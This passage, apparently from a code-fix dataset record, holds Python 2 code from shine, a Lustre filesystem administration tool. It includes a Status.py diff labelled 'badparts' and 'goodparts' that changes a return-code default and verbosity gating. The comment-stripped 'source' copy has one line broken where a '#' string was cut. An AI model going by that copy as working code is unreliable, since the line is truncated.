*\n\n\nclass GlobalStartEventHandler(FSGlobalEventHandler):\n\n    def __init__(self, verbose=1):\n        FSGlobalEventHandler.__init__(self, verbose)\n\n    def handle_pre(self, fs):\n        if self.verbose > 0:\n            print \"Starting %d targets on %s\" % (fs.target_count,\n                    fs.target_servers)\n\n    def handle_post(self, fs):\n        if self.verbose > 0:\n            Status.status_view_fs(fs, show_clients=False)\n\n    def ev_starttarget_start(self, node, target):\n        # start/restart timer if needed (we might be running a new runloop)\n        if self.verbose > 1:\n            print \"%s: Starting %s %s (%s)...\" % (node, \\\n                    target.type.upper(), target.get_id(), target.dev)\n        self.update()\n\n    def ev_starttarget_done(self, node, target):\n        self.status_changed = True\n        if self.verbose > 1:\n            if target.status_info:\n                print \"%s: Start of %s %s (%s): %s\" % \\\n                        (node, target.type.upper(), target.get_id(), target.dev,\n                                target.status_info)\n            else:\n                print \"%s: Start of %s %s (%s) succeeded\" % \\\n                        (node, target.type.upper(), target.get_id(), target.dev)\n        self.update()\n\n    def ev_starttarget_failed(self, node, target, rc, message):\n        self.status_changed = True\n        if rc:\n            strerr = os.strerror(rc)\n        else:\n            strerr = message\n        print \"%s: Failed to start %s %s (%s): %s\" % \\\n                (node, target.type.upper(), target.get_id(), target.dev,\n                        strerr)\n        if rc:\n            print message\n        self.update()\n\n\nclass LocalStartEventHandler(Shine.Lustre.EventHandler.EventHandler):\n\n    def __init__(self, verbose=1):\n        self.verbose = verbose\n\n    def ev_starttarget_start(self, node, target):\n        if self.verbose > 1:\n            print \"Starting %s %s (%s)...\" % (target.type.upper(),\n                    target.get_id(), target.dev)\n\n    def ev_starttarget_done(self, node, target):\n        if self.verbose > 1:\n            if target.status_info:\n                print \"Start of %s %s (%s): %s\" % (target.type.upper(),\n                        target.get_id(), target.dev, target.status_info)\n            else:\n                print \"Start of %s %s (%s) succeeded\" % (target.type.upper(),\n                        target.get_id(), target.dev)\n\n    def ev_starttarget_failed(self, node, target, rc, message):\n        if rc:\n            strerr = os.strerror(rc)\n        else:\n            strerr = message\n        print \"Failed to start %s %s (%s): %s\" % (target.type.upper(),\n                target.get_id(), target.dev, strerr)\n        if rc:\n            print message\n\n\nclass Start(FSLiveCommand):\n    \"\"\"\n    shine start [-f <fsname>] [-t <target>] [-i <index(es)>] [-n <nodes>] [-qv]\n    \"\"\"\n\n    def __init__(self):\n        FSLiveCommand.__init__(self)\n\n    def get_name(self):\n        return \"start\"\n\n    def get_desc(self):\n        return \"Start file system servers.\"\n\n    target_status_rc_map = { \\\n            MOUNTED : RC_OK,\n            RECOVERING : RC_OK,\n            OFFLINE : RC_FAILURE,\n            TARGET_ERROR : RC_TARGET_ERROR,\n            CLIENT_ERROR : RC_CLIENT_ERROR,\n            RUNTIME_ERROR : RC_RUNTIME_ERROR }\n\n    def fs_status_to_rc(self, status):\n        return self.target_status_rc_map[status]\n\n    def execute(self):\n        result = 0\n\n        self.init_execute()\n\n        # Get verbose level.\n        vlevel = self.verbose_support.get_verbose_level()\n\n        target = self.target_support.get_target()\n        for fsname in self.fs_support.iter_fsname():\n\n            # Install appropriate event handler.\n            eh = self.install_eventhandler(LocalStartEventHandler(vlevel),\n                    GlobalStartEventHandler(vlevel))\n\n            # Open configuration and instantiate a Lustre FS.\n            fs_conf, fs = open_lustrefs(fsname, target,\n                    nodes=self.nodes_support.get_nodeset(),\n                    indexes=self.indexes_support.get_rangeset(),\n                    event_handler=eh)\n\n            # Prepare options...\n            mount_options = {}\n            mount_paths = {}\n            for target_type in [ 'mgt', 'mdt', 'ost' ]:\n                mount_options[target_type] = fs_conf.get_target_mount_options(target_type)\n                mount_paths[target_type] = fs_conf.get_target_mount_path(target_type)\n\n            fs.set_debug(self.debug_support.has_debug())\n\n            # Will call the handle_pre() method defined by the event handler.\n            if hasattr(eh, 'pre'):\n                eh.pre(fs)\n                \n            status = fs.start(mount_options=mount_options,\n                              mount_paths=mount_paths)\n\n            rc = self.fs_status_to_rc(status)\n            if rc > result:\n                result = rc\n\n            if rc == RC_OK:\n                if vlevel > 0:\n                    print \"Start successful.\"\n                tuning = Tune.get_tuning(fs_conf)\n                status = fs.tune(tuning)\n                if status == RUNTIME_ERROR:\n                    rc = RC_RUNTIME_ERROR\n                # XXX improve tuning on start error handling\n\n            if rc == RC_RUNTIME_ERROR:\n                for nodes, msg in fs.proxy_errors:\n                    print \"%s: %s\" % (nodes, msg)\n\n            if hasattr(eh, 'post'):\n                eh.post(fs)\n\n            return rc\n"}, "/lib/Shine/Commands/Status.py": {"changes": [{"diff": "\n \n     def execute(self):\n \n-        result = -1\n+        result = 0\n \n         self.init_execute()\n \n", "add": 1, "remove": 1, "filename": "/lib/Shine/Commands/Status.py", "badparts": ["        result = -1"], "goodparts": ["        result = 0"]}, {"diff": "\n             if rc > result:\n                 result = rc\n \n-            if view == \"fs\":\n-                self.status_view_fs(fs)\n-            elif view.startswith(\"target\"):\n-                self.status_view_targets(fs)\n-            elif view.startswith(\"disk\"):\n-                self.status_view_disks(fs)\n-            else:\n-                raise CommandBadParameterError(self.view_support.get_view(),\n-                        \"fs, targets, disks\")\n+            if not self.remote_call and vlevel > 0:\n+                if view == \"fs\":\n+                    self.status_view_fs(fs)\n+                elif view.startswith(\"target\"):\n+                    self.status_view_targets(fs)\n+                elif view.startswith(\"disk\"):\n+                    self.status_view_disks(fs)\n+                else:\n+                    raise CommandBadParameterError(self.view_support.get_view(),\n+                            \"fs, targets, disks\")\n+\n         return result\n \n     def status_view_targets(sel", "add": 11, "remove": 9, "filename": "/lib/Shine/Commands/Status.py", "badparts": ["            if view == \"fs\":", "                self.status_view_fs(fs)", "            elif view.startswith(\"target\"):", "                self.status_view_targets(fs)", "            elif view.startswith(\"disk\"):", "                self.status_view_disks(fs)", "            else:", "                raise CommandBadParameterError(self.view_support.get_view(),", "                        \"fs, targets, disks\")"], "goodparts": ["            if not self.remote_call and vlevel > 0:", "                if view == \"fs\":", "                    self.status_view_fs(fs)", "                elif view.startswith(\"target\"):", "                    self.status_view_targets(fs)", "                elif view.startswith(\"disk\"):", "                    self.status_view_disks(fs)", "                else:", "                    raise CommandBadParameterError(self.view_support.get_view(),", "                            \"fs, targets, disks\")"]}], "source": "\n \"\"\" Shine `status' command classes. The status command aims to return the real state of a Lustre filesystem and its components, depending of the requested \"view\". Status views let the Lustre administrator to either stand back and get a global status of the filesystem, or if needed, to enquire about filesystem components detailed states. \"\"\" from Shine.Configuration.Configuration import Configuration from Shine.Configuration.Globals import Globals from Shine.Configuration.Exceptions import * from Base.FSLiveCommand import FSLiveCommand from Base.CommandRCDefs import * from Base.Support.View import View from Base.RemoteCallEventHandler import RemoteCallEventHandler from Exceptions import CommandBadParameterError from Shine.FSUtils import open_lustrefs from Shine.Utilities.AsciiTable import * import Shine.Lustre.EventHandler from Shine.Lustre.Disk import * from Shine.Lustre.FileSystem import * from ClusterShell.NodeSet import NodeSet import os (KILO, MEGA, GIGA, TERA)=(1024, 1048576, 1073741824, 1099511627776) class GlobalStatusEventHandler(Shine.Lustre.EventHandler.EventHandler): def __init__(self, verbose=1): self.verbose=verbose def ev_statustarget_start(self, node, target): pass def ev_statustarget_done(self, node, target): pass def ev_statustarget_failed(self, node, target, rc, message): print \"%s: Failed to status %s %s(%s)\" %(node, target.type.upper(), \\ target.get_id(), target.dev) print \">> %s\" % message def ev_statusclient_start(self, node, client): pass def ev_statusclient_done(self, node, client): pass def ev_statusclient_failed(self, node, client, rc, message): print \"%s: Failed to status of FS %s\" %(node, client.fs.fs_name) print \">> %s\" % message class Status(FSLiveCommand): \"\"\" shine status[-f <fsname>][-t <target>][-i <index(es)>][-n <nodes>][-qv] \"\"\" def __init__(self): FSLiveCommand.__init__(self) self.view_support=View(self) def get_name(self): return \"status\" def get_desc(self): return \"Check for file system target status.\" target_status_rc_map={ \\ MOUNTED: RC_ST_ONLINE, RECOVERING: RC_ST_RECOVERING, OFFLINE: RC_ST_OFFLINE, TARGET_ERROR: RC_TARGET_ERROR, CLIENT_ERROR: RC_CLIENT_ERROR, RUNTIME_ERROR: RC_RUNTIME_ERROR} def fs_status_to_rc(self, status): return self.target_status_rc_map[status] def execute(self): result=-1 self.init_execute() vlevel=self.verbose_support.get_verbose_level() target=self.target_support.get_target() for fsname in self.fs_support.iter_fsname(): eh=self.install_eventhandler(None, GlobalStatusEventHandler(vlevel)) fs_conf, fs=open_lustrefs(fsname, target, nodes=self.nodes_support.get_nodeset(), indexes=self.indexes_support.get_rangeset(), event_handler=eh) fs.set_debug(self.debug_support.has_debug()) status_flags=STATUS_ANY view=self.view_support.get_view() if view is None: view=\"fs\" else: view=view.lower() if view.startswith(\"disk\") or view.startswith(\"target\"): status_flags &=~STATUS_CLIENTS if view.startswith(\"client\"): status_flags &=~(STATUS_SERVERS|STATUS_HASERVERS) statusdict=fs.status(status_flags) if RUNTIME_ERROR in statusdict: defect_targets=statusdict[RUNTIME_ERROR] for nodes, msg in fs.proxy_errors: print nodes print '-' * 15 print msg print else: defect_targets=[] rc=self.fs_status_to_rc(max(statusdict.keys())) if rc > result: result=rc if view==\"fs\": self.status_view_fs(fs) elif view.startswith(\"target\"): self.status_view_targets(fs) elif view.startswith(\"disk\"): self.status_view_disks(fs) else: raise CommandBadParameterError(self.view_support.get_view(), \"fs, targets, disks\") return result def status_view_targets(self, fs): \"\"\" View: lustre targets \"\"\" print \"FILESYSTEM TARGETS(%s)\" % fs.fs_name class target_dict(dict): def __lt__(self, other): return self[\"index\"] < other[\"index\"] ldic=[] for type,(all_targets, enabled_targets) in fs.targets_by_type(): for target in enabled_targets: if target.state==OFFLINE: status=\"offline\" elif target.state==TARGET_ERROR: status=\"ERROR\" elif target.state==RECOVERING: status=\"recovering %s\" % target.status_info elif target.state==MOUNTED: status=\"online\" else: status=\"UNKNOWN\" ldic.append(target_dict([[\"target\", target.get_id()], [\"type\", target.type.upper()], [\"nodes\", NodeSet.fromlist(target.servers)], [\"device\", target.dev], [\"index\", target.index], [\"status\", status]])) ldic.sort() layout=AsciiTableLayout() layout.set_show_header(True) layout.set_column(\"target\", 0, AsciiTableLayout.LEFT, \"target id\", AsciiTableLayout.CENTER) layout.set_column(\"type\", 1, AsciiTableLayout.LEFT, \"type\", AsciiTableLayout.CENTER) layout.set_column(\"index\", 2, AsciiTableLayout.RIGHT, \"idx\", AsciiTableLayout.CENTER) layout.set_column(\"nodes\", 3, AsciiTableLayout.LEFT, \"nodes\", AsciiTableLayout.CENTER) layout.set_column(\"device\", 4, AsciiTableLayout.LEFT, \"device\", AsciiTableLayout.CENTER) layout.set_column(\"status\", 5, AsciiTableLayout.LEFT, \"status\", AsciiTableLayout.CENTER) AsciiTable().print_from_list_of_dict(ldic, layout) def status_view_fs(cls, fs, show_clients=True): \"\"\" View: lustre FS summary \"\"\" ldic=[] for type,(a_targets, e_targets) in fs.targets_by_type(): nodes=NodeSet() t_offline=[] t_error=[] t_recovering=[] t_online=[] t_runtime=[] t_unknown=[] for target in a_targets: nodes.add(target.servers[0]) if target.state==OFFLINE: t_offline.append(target) elif target.state==TARGET_ERROR: t_error.append(target) elif target.state==RECOVERING: t_recovering.append(target) elif target.state==MOUNTED: t_online.append(target) elif target.state==RUNTIME_ERROR: t_runtime.append(target) else: t_unknown.append(target) status=[] if len(t_offline) > 0: status.append(\"offline(%d)\" % len(t_offline)) if len(t_error) > 0: status.append(\"ERROR(%d)\" % len(t_error)) if len(t_recovering) > 0: status.append(\"recovering(%d) for %s\" %(len(t_recovering), t_recovering[0].status_info)) if len(t_online) > 0: status.append(\"online(%d)\" % len(t_online)) if len(t_runtime) > 0: status.append(\"CHECK FAILURE(%d)\" % len(t_runtime)) if len(t_unknown) > 0: status.append(\"not checked(%d)\" % len(t_unknown)) if len(t_unknown) < len(a_targets): ldic.append(dict([[\"type\", \"%s\" % type.upper()], [\"count\", len(a_targets)],[\"nodes\", nodes], [\"status\", ', '.join(status)]])) if show_clients: (c_ign, c_offline, c_error, c_runtime, c_mounted)=fs.get_client_statecounters() status=[] if c_ign > 0: status.append(\"not checked(%d)\" % c_ign) if c_offline > 0: status.append(\"offline(%d)\" % c_offline) if c_error > 0: status.append(\"ERROR(%d)\" % c_error) if c_runtime > 0: status.append(\"CHECK FAILURE(%d)\" % c_runtime) if c_mounted > 0: status.append(\"mounted(%d)\" % c_mounted) ldic.append(dict([[\"type\", \"CLI\"],[\"count\", len(fs.clients)], [\"nodes\", \"%s\" % fs.get_client_servers()],[\"status\", ', '.join(status)]])) layout=AsciiTableLayout() layout.set_show_header(True) layout.set_column(\"type\", 0, AsciiTableLayout.CENTER, \"type\", AsciiTableLayout.CENTER) layout.set_column(\"count\", 1, AsciiTableLayout.RIGHT, \" layout.set_column(\"nodes\", 2, AsciiTableLayout.LEFT, \"nodes\", AsciiTableLayout.CENTER) layout.set_column(\"status\", 3, AsciiTableLayout.LEFT, \"status\", AsciiTableLayout.CENTER) print \"FILESYSTEM COMPONENTS STATUS(%s)\" % fs.fs_name AsciiTable().print_from_list_of_dict(ldic, layout) status_view_fs=classmethod(status_view_fs) def status_view_disks(self, fs): \"\"\" View: lustre disks \"\"\" print \"FILESYSTEM DISKS(%s)\" % fs.fs_name class target_dict(dict): def __lt__(self, other): return self[\"index\"] < other[\"index\"] ldic=[] jdev_col_enabled=False tag_col_enabled=False for type,(all_targets, enabled_targets) in fs.targets_by_type(): for target in enabled_targets: if target.state==OFFLINE: status=\"offline\" elif target.state==RECOVERING: status=\"recovering %s\" % target.status_info elif target.state==MOUNTED: status=\"online\" elif target.state==TARGET_ERROR: status=\"ERROR\" elif target.state==RUNTIME_ERROR: status=\"CHECK FAILURE\" else: status=\"UNKNOWN\" if target.dev_size >=TERA: dev_size=\"%.1fT\" %(target.dev_size/TERA) elif target.dev_size >=GIGA: dev_size=\"%.1fG\" %(target.dev_size/GIGA) elif target.dev_size >=MEGA: dev_size=\"%.1fM\" %(target.dev_size/MEGA) elif target.dev_size >=KILO: dev_size=\"%.1fK\" %(target.dev_size/KILO) else: dev_size=\"%d\" % target.dev_size if target.jdev: jdev_col_enabled=True jdev=target.jdev else: jdev=\"\" if target.tag: tag_col_enabled=True tag=target.tag else: tag=\"\" flags=[] if target.has_need_index_flag(): flags.append(\"need_index\") if target.has_first_time_flag(): flags.append(\"first_time\") if target.has_update_flag(): flags.append(\"update\") if target.has_rewrite_ldd_flag(): flags.append(\"rewrite_ldd\") if target.has_writeconf_flag(): flags.append(\"writeconf\") if target.has_upgrade14_flag(): flags.append(\"upgrade14\") if target.has_param_flag(): flags.append(\"conf_param\") ldic.append(target_dict([\\ [\"nodes\", NodeSet.fromlist(target.servers)], [\"dev\", target.dev], [\"size\", dev_size], [\"jdev\", jdev], [\"type\", target.type.upper()], [\"index\", target.index], [\"tag\", tag], [\"label\", target.label], [\"flags\", ' '.join(flags)], [\"fsname\", target.fs.fs_name], [\"status\", status]])) ldic.sort() layout=AsciiTableLayout() layout.set_show_header(True) i=0 layout.set_column(\"dev\", i, AsciiTableLayout.LEFT, \"device\", AsciiTableLayout.CENTER) i +=1 layout.set_column(\"nodes\", i, AsciiTableLayout.LEFT, \"node(s)\", AsciiTableLayout.CENTER) i +=1 layout.set_column(\"size\", i, AsciiTableLayout.RIGHT, \"dev size\", AsciiTableLayout.CENTER) if jdev_col_enabled: i +=1 layout.set_column(\"jdev\", i, AsciiTableLayout.RIGHT, \"journal device\", AsciiTableLayout.CENTER) i +=1 layout.set_column(\"type\", i, AsciiTableLayout.LEFT, \"type\", AsciiTableLayout.CENTER) i +=1 layout.set_column(\"index\", i, AsciiTableLayout.RIGHT, \"index\", AsciiTableLayout.CENTER) if tag_col_enabled: i +=1 layout.set_column(\"tag\", i, AsciiTableLayout.LEFT, \"tag\", AsciiTableLayout.CENTER) i +=1 layout.set_column(\"label\", i, AsciiTableLayout.LEFT, \"label\", AsciiTableLayout.CENTER) i +=1 layout.set_column(\"flags\", i, AsciiTableLayout.LEFT, \"ldd flags\", AsciiTableLayout.CENTER) i +=1 layout.set_column(\"fsname\", i, AsciiTableLayout.LEFT, \"fsname\", AsciiTableLayout.CENTER) i +=1 layout.set_column(\"status\", i, AsciiTableLayout.LEFT, \"status\", AsciiTableLayout.CENTER) AsciiTable().print_from_list_of_dict(ldic, layout) ", "sourceWithComments": "# Status.py -- Check remote filesystem servers and targets status\n# Copyright (C) 2009 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\n\"\"\"\nShine `status' command classes.\n\nThe status command aims to return the real state of a Lustre filesystem\nand its components, depending of the requested \"view\". Status views let\nthe Lustre administrator to either stand back and get a global status\nof the filesystem, or if needed, to enquire about filesystem components\ndetailed states.\n\"\"\"\n\n# Configuration\nfrom Shine.Configuration.Configuration import Configuration\nfrom Shine.Configuration.Globals import Globals \nfrom Shine.Configuration.Exceptions import *\n\n# Command base class\nfrom Base.FSLiveCommand import FSLiveCommand\nfrom Base.CommandRCDefs import *\n# Additional options\nfrom Base.Support.View import View\n# -R handler\nfrom Base.RemoteCallEventHandler import RemoteCallEventHandler\n\n\n# Error handling\nfrom Exceptions import CommandBadParameterError\n\n# Command helper\nfrom Shine.FSUtils import open_lustrefs\n\n# Command output formatting\nfrom Shine.Utilities.AsciiTable import *\n\n# Lustre events and errors\nimport Shine.Lustre.EventHandler\nfrom Shine.Lustre.Disk import *\nfrom Shine.Lustre.FileSystem import *\n\nfrom ClusterShell.NodeSet import NodeSet\n\nimport os\n\n\n(KILO, MEGA, GIGA, TERA) = (1024, 1048576, 1073741824, 1099511627776)\n\n\nclass GlobalStatusEventHandler(Shine.Lustre.EventHandler.EventHandler):\n\n    def __init__(self, verbose=1):\n        self.verbose = verbose\n\n    def ev_statustarget_start(self, node, target):\n        pass\n\n    def ev_statustarget_done(self, node, target):\n        pass\n\n    def ev_statustarget_failed(self, node, target, rc, message):\n        print \"%s: Failed to status %s %s (%s)\" % (node, target.type.upper(), \\\n                target.get_id(), target.dev)\n        print \">> %s\" % message\n\n    def ev_statusclient_start(self, node, client):\n        pass\n\n    def ev_statusclient_done(self, node, client):\n        pass\n\n    def ev_statusclient_failed(self, node, client, rc, message):\n        print \"%s: Failed to status of FS %s\" % (node, client.fs.fs_name)\n        print \">> %s\" % message\n\n\nclass Status(FSLiveCommand):\n    \"\"\"\n    shine status [-f <fsname>] [-t <target>] [-i <index(es)>] [-n <nodes>] [-qv]\n    \"\"\"\n\n    def __init__(self):\n        FSLiveCommand.__init__(self)\n        self.view_support = View(self)\n\n    def get_name(self):\n        return \"status\"\n\n    def get_desc(self):\n        return \"Check for file system target status.\"\n\n\n    target_status_rc_map = { \\\n            MOUNTED : RC_ST_ONLINE,\n            RECOVERING : RC_ST_RECOVERING,\n            OFFLINE : RC_ST_OFFLINE,\n            TARGET_ERROR : RC_TARGET_ERROR,\n            CLIENT_ERROR : RC_CLIENT_ERROR,\n            RUNTIME_ERROR : RC_RUNTIME_ERROR }\n\n    def fs_status_to_rc(self, status):\n        return self.target_status_rc_map[status]\n\n    def execute(self):\n\n        result = -1\n\n        self.init_execute()\n\n        # Get verbose level.\n        vlevel = self.verbose_support.get_verbose_level()\n\n        target = self.target_support.get_target()\n        for fsname in self.fs_support.iter_fsname():\n\n            # Install appropriate event handler.\n            eh = self.install_eventhandler(None, GlobalStatusEventHandler(vlevel))\n\n            fs_conf, fs = open_lustrefs(fsname, target,\n                    nodes=self.nodes_support.get_nodeset(),\n                    indexes=self.indexes_support.get_rangeset(),\n                    event_handler=eh)\n\n            fs.set_debug(self.debug_support.has_debug())\n\n            status_flags = STATUS_ANY\n            view = self.view_support.get_view()\n\n            # default view\n            if view is None:\n                view = \"fs\"\n            else:\n                view = view.lower()\n\n            # disable client checks when not requested\n            if view.startswith(\"disk\") or view.startswith(\"target\"):\n                status_flags &= ~STATUS_CLIENTS\n            # disable servers checks when not requested\n            if view.startswith(\"client\"):\n                status_flags &= ~(STATUS_SERVERS|STATUS_HASERVERS)\n\n            statusdict = fs.status(status_flags)\n\n            if RUNTIME_ERROR in statusdict:\n                # get targets that couldn't be checked\n                defect_targets = statusdict[RUNTIME_ERROR]\n\n                for nodes, msg in fs.proxy_errors:\n                    print nodes\n                    print '-' * 15\n                    print msg\n                print\n\n            else:\n                defect_targets = []\n\n            rc = self.fs_status_to_rc(max(statusdict.keys()))\n            if rc > result:\n                result = rc\n\n            if view == \"fs\":\n                self.status_view_fs(fs)\n            elif view.startswith(\"target\"):\n                self.status_view_targets(fs)\n            elif view.startswith(\"disk\"):\n                self.status_view_disks(fs)\n            else:\n                raise CommandBadParameterError(self.view_support.get_view(),\n                        \"fs, targets, disks\")\n        return result\n\n    def status_view_targets(self, fs):\n        \"\"\"\n        View: lustre targets\n        \"\"\"\n        print \"FILESYSTEM TARGETS (%s)\" % fs.fs_name\n\n        # override dict to allow target sorting by index\n        class target_dict(dict):\n            def __lt__(self, other):\n                return self[\"index\"] < other[\"index\"]\n\n        ldic = []\n        for type, (all_targets, enabled_targets) in fs.targets_by_type():\n            for target in enabled_targets:\n\n                if target.state == OFFLINE:\n                    status = \"offline\"\n                elif target.state == TARGET_ERROR:\n                    status = \"ERROR\"\n                elif target.state == RECOVERING:\n                    status = \"recovering %s\" % target.status_info\n                elif target.state == MOUNTED:\n                    status = \"online\"\n                else:\n                    status = \"UNKNOWN\"\n\n                ldic.append(target_dict([[\"target\", target.get_id()],\n                    [\"type\", target.type.upper()],\n                    [\"nodes\", NodeSet.fromlist(target.servers)],\n                    [\"device\", target.dev],\n                    [\"index\", target.index],\n                    [\"status\", status]]))\n\n        ldic.sort()\n        layout = AsciiTableLayout()\n        layout.set_show_header(True)\n        layout.set_column(\"target\", 0, AsciiTableLayout.LEFT, \"target id\",\n                AsciiTableLayout.CENTER)\n        layout.set_column(\"type\", 1, AsciiTableLayout.LEFT, \"type\",\n                AsciiTableLayout.CENTER)\n        layout.set_column(\"index\", 2, AsciiTableLayout.RIGHT, \"idx\",\n                AsciiTableLayout.CENTER)\n        layout.set_column(\"nodes\", 3, AsciiTableLayout.LEFT, \"nodes\",\n                AsciiTableLayout.CENTER)\n        layout.set_column(\"device\", 4, AsciiTableLayout.LEFT, \"device\",\n                AsciiTableLayout.CENTER)\n        layout.set_column(\"status\", 5, AsciiTableLayout.LEFT, \"status\",\n                AsciiTableLayout.CENTER)\n\n        AsciiTable().print_from_list_of_dict(ldic, layout)\n\n\n    def status_view_fs(cls, fs, show_clients=True):\n        \"\"\"\n        View: lustre FS summary\n        \"\"\"\n        ldic = []\n\n        # targets\n        for type, (a_targets, e_targets) in fs.targets_by_type():\n            nodes = NodeSet()\n            t_offline = []\n            t_error = []\n            t_recovering = []\n            t_online = []\n            t_runtime = []\n            t_unknown = []\n            for target in a_targets:\n                nodes.add(target.servers[0])\n\n                # check target status\n                if target.state == OFFLINE:\n                    t_offline.append(target)\n                elif target.state == TARGET_ERROR:\n                    t_error.append(target)\n                elif target.state == RECOVERING:\n                    t_recovering.append(target)\n                elif target.state == MOUNTED:\n                    t_online.append(target)\n                elif target.state == RUNTIME_ERROR:\n                    t_runtime.append(target)\n                else:\n                    t_unknown.append(target)\n\n            status = []\n            if len(t_offline) > 0:\n                status.append(\"offline (%d)\" % len(t_offline))\n            if len(t_error) > 0:\n                status.append(\"ERROR (%d)\" % len(t_error))\n            if len(t_recovering) > 0:\n                status.append(\"recovering (%d) for %s\" % (len(t_recovering),\n                    t_recovering[0].status_info))\n            if len(t_online) > 0:\n                status.append(\"online (%d)\" % len(t_online))\n            if len(t_runtime) > 0:\n                status.append(\"CHECK FAILURE (%d)\" % len(t_runtime))\n            if len(t_unknown) > 0:\n                status.append(\"not checked (%d)\" % len(t_unknown))\n\n            if len(t_unknown) < len(a_targets):\n                ldic.append(dict([[\"type\", \"%s\" % type.upper()],\n                    [\"count\", len(a_targets)], [\"nodes\", nodes],\n                    [\"status\", ', '.join(status)]]))\n\n        # clients\n        if show_clients:\n            (c_ign, c_offline, c_error, c_runtime, c_mounted) = fs.get_client_statecounters()\n            status = []\n            if c_ign > 0:\n                status.append(\"not checked (%d)\" % c_ign)\n            if c_offline > 0:\n                status.append(\"offline (%d)\" % c_offline)\n            if c_error > 0:\n                status.append(\"ERROR (%d)\" % c_error)\n            if c_runtime > 0:\n                status.append(\"CHECK FAILURE (%d)\" % c_runtime)\n            if c_mounted > 0:\n                status.append(\"mounted (%d)\" % c_mounted)\n\n            ldic.append(dict([[\"type\", \"CLI\"], [\"count\", len(fs.clients)],\n                [\"nodes\", \"%s\" % fs.get_client_servers()], [\"status\", ', '.join(status)]]))\n\n        layout = AsciiTableLayout()\n        layout.set_show_header(True)\n        layout.set_column(\"type\", 0, AsciiTableLayout.CENTER, \"type\", AsciiTableLayout.CENTER)\n        layout.set_column(\"count\", 1, AsciiTableLayout.RIGHT, \"#\", AsciiTableLayout.CENTER)\n        layout.set_column(\"nodes\", 2, AsciiTableLayout.LEFT, \"nodes\", AsciiTableLayout.CENTER)\n        layout.set_column(\"status\", 3, AsciiTableLayout.LEFT, \"status\", AsciiTableLayout.CENTER)\n\n        print \"FILESYSTEM COMPONENTS STATUS (%s)\" % fs.fs_name\n        AsciiTable().print_from_list_of_dict(ldic, layout)\n\n    status_view_fs = classmethod(status_view_fs)\n\n\n    def status_view_disks(self, fs):\n        \"\"\"\n        View: lustre disks\n        \"\"\"\n\n        print \"FILESYSTEM DISKS (%s)\" % fs.fs_name\n\n        # override dict to allow target sorting by index\n        class target_dict(dict):\n            def __lt__(self, other):\n                return self[\"index\"] < other[\"index\"] \n        ldic = []\n        jdev_col_enabled = False\n        tag_col_enabled = False\n        for type, (all_targets, enabled_targets) in fs.targets_by_type():\n            for target in enabled_targets:\n\n                if target.state == OFFLINE:\n                    status = \"offline\"\n                elif target.state == RECOVERING:\n                    status = \"recovering %s\" % target.status_info\n                elif target.state == MOUNTED:\n                    status = \"online\"\n                elif target.state == TARGET_ERROR:\n                    status = \"ERROR\"\n                elif target.state == RUNTIME_ERROR:\n                    status = \"CHECK FAILURE\"\n                else:\n                    status = \"UNKNOWN\"\n\n                if target.dev_size >= TERA:\n                    dev_size = \"%.1fT\" % (target.dev_size/TERA)\n                elif target.dev_size >= GIGA:\n                    dev_size = \"%.1fG\" % (target.dev_size/GIGA)\n                elif target.dev_size >= MEGA:\n                    dev_size = \"%.1fM\" % (target.dev_size/MEGA)\n                elif target.dev_size >= KILO:\n                    dev_size = \"%.1fK\" % (target.dev_size/KILO)\n                else:\n                    dev_size = \"%d\" % target.dev_size\n\n                if target.jdev:\n                    jdev_col_enabled = True\n                    jdev = target.jdev\n                else:\n                    jdev = \"\"\n\n                if target.tag:\n                    tag_col_enabled = True\n                    tag = target.tag\n                else:\n                    tag = \"\"\n\n                flags = []\n                if target.has_need_index_flag():\n                    flags.append(\"need_index\")\n                if target.has_first_time_flag():\n                    flags.append(\"first_time\")\n                if target.has_update_flag():\n                    flags.append(\"update\")\n                if target.has_rewrite_ldd_flag():\n                    flags.append(\"rewrite_ldd\")\n                if target.has_writeconf_flag():\n                    flags.append(\"writeconf\")\n                if target.has_upgrade14_flag():\n                    flags.append(\"upgrade14\")\n                if target.has_param_flag():\n                    flags.append(\"conf_param\")\n\n                ldic.append(target_dict([\\\n                    [\"nodes\", NodeSet.fromlist(target.servers)],\n                    [\"dev\", target.dev],\n                    [\"size\", dev_size],\n                    [\"jdev\", jdev],\n                    [\"type\", target.type.upper()],\n                    [\"index\", target.index],\n                    [\"tag\", tag],\n                    [\"label\", target.label],\n                    [\"flags\", ' '.join(flags)],\n                    [\"fsname\", target.fs.fs_name],\n                    [\"status\", status]]))\n\n        ldic.sort()\n        layout = AsciiTableLayout()\n        layout.set_show_header(True)\n        i = 0\n        layout.set_column(\"dev\", i, AsciiTableLayout.LEFT, \"device\",\n                AsciiTableLayout.CENTER)\n        i += 1\n        layout.set_column(\"nodes\", i, AsciiTableLayout.LEFT, \"node(s)\",\n                AsciiTableLayout.CENTER)\n        i += 1\n        layout.set_column(\"size\", i, AsciiTableLayout.RIGHT, \"dev size\",\n                AsciiTableLayout.CENTER)\n        if jdev_col_enabled:\n            i += 1\n            layout.set_column(\"jdev\", i, AsciiTableLayout.RIGHT, \"journal device\",\n                    AsciiTableLayout.CENTER)\n        i += 1\n        layout.set_column(\"type\", i, AsciiTableLayout.LEFT, \"type\",\n                AsciiTableLayout.CENTER)\n        i += 1\n        layout.set_column(\"index\", i, AsciiTableLayout.RIGHT, \"index\",\n                AsciiTableLayout.CENTER)\n        if tag_col_enabled:\n            i += 1\n            layout.set_column(\"tag\", i, AsciiTableLayout.LEFT, \"tag\",\n                    AsciiTableLayout.CENTER)\n        i += 1\n        layout.set_column(\"label\", i, AsciiTableLayout.LEFT, \"label\",\n                AsciiTableLayout.CENTER)\n        i += 1\n        layout.set_column(\"flags\", i, AsciiTableLayout.LEFT, \"ldd flags\",\n                AsciiTableLayout.CENTER)\n        i += 1\n        layout.set_column(\"fsname\", i, AsciiTableLayout.LEFT, \"fsname\",\n                AsciiTableLayout.CENTER)\n        i += 1\n        layout.set_column(\"status\", i, AsciiTableLayout.LEFT, \"status\",\n                AsciiTableLayout.CENTER)\n\n        AsciiTable().print_from_list_of_dict(ldic, layout)\n\n"}, 